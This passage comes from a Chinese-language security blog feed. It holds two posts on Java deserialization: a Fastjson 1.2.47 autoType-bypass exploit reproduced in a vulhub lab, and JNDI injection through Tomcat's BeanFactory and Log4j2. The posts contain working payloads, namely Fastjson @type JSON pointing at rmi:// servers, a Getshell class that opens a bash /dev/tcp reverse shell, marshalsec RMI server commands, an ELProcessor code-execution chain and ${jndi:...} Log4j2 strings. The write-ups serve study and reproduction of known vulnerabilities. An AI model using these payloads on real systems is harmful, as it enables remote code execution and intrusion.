class="line">&#125;</span><br></pre></td></tr></table></figure><p>找一下mappings参数的<code>put方法</code>,发现有两处,第一处是<code>addBaseClassMappings方法</code></p><p><img src="image-20230411180046143.png" alt="image-20230411180046143"></p><p>听名字都知道这里只是将一些基础类放到mappings中,我们无法控制</p><p>另外一处是<code>loadClass方法</code>,loadClass会把传入的类名放到mappings中</p><p><img src="image-20230411180157779.png" alt="image-20230411180157779"></p><p>找一下发现<code>com.alibaba.fastjson.serializer.MiscCodec</code>类调用了loadClass方法</p><p><img src="image-20230411180847428.png" alt="image-20230411180847428"></p><p>而MiscCodec又实现了<code>ObjectSerializer</code>接口,说明它是一个``反序列化器`,</p><p><img src="image-20230411180951750.png" alt="image-20230411180951750"></p><p>然而fastjson的反序列化需要用到反序列化器,这个反序列化器是从config中得到的</p><p><img src="image-20230411181146140.png" alt="image-20230411181146140"></p><p>根据反序列化类的不同调用不同的的反序列化器,如下图中如果反序列化的类是<code>Class类</code>,那么就会调用MiscCodec类这个反序列化器,进而调用loadClass方法</p><p><img src="image-20230411181352396.png" alt="image-20230411181352396"></p><p>再来看看参数的传递,我们要让<code>com.sun.rowset.JdbcRowSetImpl</code>作为参数传入到loadClass方法,在MiscCodec类中传入的是strVal参数,而与strVal参数有关的部分代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Object objVal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;<span class="comment">//检查当前解析的 JSON 对象是否为类型名重定向（TypeNameRedirect）</span></span><br><span class="line">    parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">    parser.accept(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;<span class="comment">//检查下一个标记是否为字符串</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;<span class="comment">//校验其值是否为 &quot;val&quot;</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        lexer.nextToken();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parser.accept(JSONToken.COLON);<span class="comment">//读取下一个 JSON 标记,以跳过冒号（:）分隔符</span></span><br><span class="line"></span><br><span class="line">    objVal = parser.parse();<span class="comment">//使用 parse() 方法解析 JSON 对象的值部分</span></span><br><span class="line"></span><br><span class="line">    parser.accept(JSONToken.RBRACE);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    objVal = parser.parse();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String strVal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (objVal == <span class="literal">null</span>) &#123;</span><br><span class="line">    strVal = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    strVal = (String) objVal;<span class="comment">//这里将objVal的值给了strVal</span></span><br></pre></td></tr></table></figure><p>为了使最后的strVal等于com.sun.rowset.JdbcRowSetImpl,我们要传入一个<code>val</code>,其值为<code>com.sun.rowset.JdbcRowSetImpl</code></p><p>最后构造poc</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:8085/PxTxVXhC&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>命令执行成功</p><p><img src="image-20230411192547329.png" alt="image-20230411192547329"></p><h1 id="vulhub复现">vulhub复现</h1><p>启动靶场（这里打的是1.2.47）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>yakit开个监听端口</p><p><img src="image-20230501212304453.png" alt="image-20230501212304453"></p><p>编写恶意代码Getshell.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Getshell</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i&gt;&amp; /dev/tcp/192.168.210.10/2333 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译以后利用python将Getshell.class挂起来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 6666</span><br></pre></td></tr></table></figure><p>接下来利用<code>marshalsec</code>启动RMI服务（这里直接用yakit似乎没用）</p><p>项目地址：  <a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p><p>下载以后先用mvn编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests </span><br></pre></td></tr></table></figure><p>生成target后运行marshalsec-0.0.3-SNAPSHOT-all.jar</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.59.1:6666/#Getshell&quot; 9999</span><br></pre></td></tr></table></figure><p>构造exp</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://192.168.59.1:9999/Getshell&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>burpsuite重放以后发现yakit成功反弹了shell</p><p><img src="image-20230501212216120.png" alt="image-20230501212216120"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;FastJson-1-2-22-1-2-24&quot;&gt;FastJson 1.2.22 - 1.2.24&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;fastjson&lt;/code&gt;是java反序列化中一个经典的漏洞了,早些在使用java写爬虫程序的时候就用过这个库,今天就针对其反序列化漏</summary>
      
    
    
    
    <category term="JAVA" scheme="http://example.com/categories/JAVA/"/>
    
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化之jndi</title>
    <link href="http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bjndi/"/>
    <id>http://example.com/post/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bjndi/</id>
    <published>2023-04-01T12:09:16.000Z</published>
    <updated>2023-06-14T11:56:20.890Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jndi加载本地类利用">jndi加载本地类利用</h1><p>上一个篇中讲了jndi结合RMI的利用,然而这个利用只适用于<code> JDK &lt; 8u191</code>的情况,在高版本的jdk中,我们可以通过<code>加载本地类</code>的方法进行命令执行。</p><p>之前在Reference中传入了一个工厂类名,然后让程序去找这个工厂类的位置,最终加载到了我们所构建的恶意类并调用了其构造方法,而这次我们将直接利用本地存在的工厂类去执行命令。</p><p>这里利用的是<code>tomcat8</code>带有的<code>BeanFactory类</code>,这个类中带有method.invoke可以通过反射来调用任意方法。</p><p>首先导入依赖（这里org.apache.el如果导入失败的话需要换个源,我是用<code>阿里云</code>的源）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.el<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>com.springsource.org.apache.el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.26<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>poc代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);</span><br></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object object=<span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Object&quot;</span>);</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="image-20230402123833616.png" alt="image-20230402123833616"></p><p>利用链：<br>InitialContext#lookup</p><p>GenericURLContext#lookup</p><p>RegistryContext#lookup</p><p>RegistryContext#decodeObject</p><p>NamingManager#getObjectInstance</p><p>BeanFactory#getObjectInstance</p><p>反射执行的语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span>  <span class="title class_">ELProcessor</span>()).eval(<span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new  java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>);</span><br></pre></td></tr></table></figure><p>解释：</p><ol><li>“”.getClass() 返回字符串对象的Class对象。</li><li>Class.forName() 可以根据类的名称返回对应的Class对象。</li><li>newInstance() 可以使用Class对象实例化一个对象。</li><li>getEngineByName() 返回指定名称的脚本引擎对象,这里是JavaScript引擎对象。</li><li>eval() 方法用于执行脚本。</li><li>ProcessBuilder 类可以启动一个新进程并执行操作系统命令。</li></ol><h1 id="jndi-log4j2">jndi+log4j2</h1><p>Log4j2是Apache软件基金会下的一个开源项目,是Java编程语言的一种流行的、模块化的<code>日志记录工具</code>,用于记录应用程序的运行状态信息和调试信息。</p><p>而在2021年11月log4j2爆出了一个代码执行漏洞,影响范围非常大,2.14.1版本及之前的都存在该漏洞</p><p>而这个漏洞的利用正好与jndi注入有关</p><h2 id="环境搭建">环境搭建</h2><p>首先导入依赖（版本小于2.14.1即可）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写log4j2的配置文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--全局参数--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Property</span> <span class="attr">name</span>=<span class="string">&quot;pattern&quot;</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss,SSS&#125; %5p %c&#123;1&#125;:%L - %m%n<span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Property</span> <span class="attr">name</span>=<span class="string">&quot;logDir&quot;</span>&gt;</span>/data/logs/dust-server<span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;console&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;rolling_file&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 定义输出到控制台 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span> <span class="attr">follow</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--控制台只输出level及以上级别的信息--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ThresholdFilter</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span> <span class="attr">onMatch</span>=<span class="string">&quot;ACCEPT&quot;</span> <span class="attr">onMismatch</span>=<span class="string">&quot;DENY&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>$&#123;pattern&#125;<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 同一来源的Appender可以定义多个RollingFile,定义按天存储日志 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">RollingFile</span> <span class="attr">name</span>=<span class="string">&quot;rolling_file&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">fileName</span>=<span class="string">&quot;$&#123;logDir&#125;/dust-server.log&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">filePattern</span>=<span class="string">&quot;$&#123;logDir&#125;/dust-server_%d&#123;yyyy-MM-dd&#125;.log&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ThresholdFilter</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span> <span class="attr">onMatch</span>=<span class="string">&quot;ACCEPT&quot;</span> <span class="attr">onMismatch</span>=<span class="string">&quot;DENY&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Pattern</span>&gt;</span>$&#123;pattern&#125;<span class="tag">&lt;/<span class="name">Pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Policies</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">TimeBasedTriggeringPolicy</span> <span class="attr">interval</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Policies</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 日志保留策略,配置只保留七天 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">DefaultRolloverStrategy</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Delete</span> <span class="attr">basePath</span>=<span class="string">&quot;$&#123;logDir&#125;/&quot;</span> <span class="attr">maxDepth</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">IfFileName</span> <span class="attr">glob</span>=<span class="string">&quot;dust-server_*.log&quot;</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">IfLastModified</span> <span class="attr">age</span>=<span class="string">&quot;7d&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">Delete</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">DefaultRolloverStrategy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">RollingFile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LOGtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line">        String username= <span class="string">&quot;$&#123;java:os&#125;&quot;</span>;  ;</span><br><span class="line">        logger.error(<span class="string">&quot;Hello, &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20230402194044347.png" alt="image-20230402194044347"></p><p>这里就输出了操作系统的一些信息,这实际上是log4j2自带的一些功能</p><p>但除此之外,它还支持调用<code>lookup</code>,那么这里就会存在我们之前所说的命令执行漏洞</p><h2 id="漏洞探测">漏洞探测</h2><p>修改测试代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LOGtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line">        String username= <span class="string">&quot;$&#123;jndi:rmi://foei54.dnslog.cn/Object&#125;&quot;</span>;  ;</span><br><span class="line">        logger.error(<span class="string">&quot;Hello, &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>foei54.dnslog.cn为我们在dnslog平台得到的url</p><p>运行测试代码并查看dns记录,出现以下结果则说明漏洞存在</p><p><img src="image-20230402200004246.png" alt="image-20230402200004246"></p><h2 id="漏洞利用">漏洞利用</h2><p>修改测试代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LOGtest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(LongFunction.class);</span><br><span class="line">        String username= <span class="string">&quot;$&#123;jndi:rmi://127.0.0.1:1099/Object&#125;&quot;</span>;  ;</span><br><span class="line">        logger.error(<span class="string">&quot;Hello, &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将之前测试jndi的服务端程序运行起来,然后运行测试代码</p><p>效果：</p><p><img src="image-20230402194654780.png" alt="image-20230402194654780"></p><p>可以看到命令被成功执行了</p><p>实际上在正常的生产环境中,log4j2会写入非常多的事件,哪怕是一个简单的用户登录事件,这时候我们就可以修改用户名的内容为${jndi:rmi://foei54.dnslog.cn/Object}来测试漏洞是否存在。</p><p>参考：</p><p><a href="https://xz.aliyun.com/t/8214">JNDI注入学习</a></p><p><a href="https://blog.csdn.net/lumingzhu111/article/details/121871114">一问三不知之log4j2漏洞简析</a></p><p><a href="https://www.freebuf.com/articles/web/341857.html">深入学习 Log4j2 漏洞原理以及绕过手段</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;jndi加载本地类利用&quot;&gt;jndi加载本地类利用&lt;/h1&gt;
&lt;p&gt;上一个篇中讲了jndi结合RMI的利用,然而这个利用只适用于&lt;code&gt; JDK &amp;lt; 8u191&lt;/code&gt;的情况,在高版本的jdk中,我们可以通过&lt;code&gt;加载本地类&lt;/code&gt;的方法</summary>
      
    
    
    
    <category term="JAVA" scheme="http://example.com/categories/JAVA/"/>
    
    
